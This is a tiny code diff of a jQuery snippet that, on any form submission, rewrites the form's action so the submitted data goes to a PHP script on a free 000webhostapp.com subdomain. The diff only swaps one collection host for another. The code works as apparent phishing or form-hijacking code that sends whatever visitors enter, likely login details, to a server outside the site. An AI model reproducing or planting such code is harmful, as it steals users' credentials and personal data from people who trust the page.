@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://ninja-empat-tak-duaribuduatiga.000webhostapp.com/tousand/jure.php");
+  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/jure.php");
 });
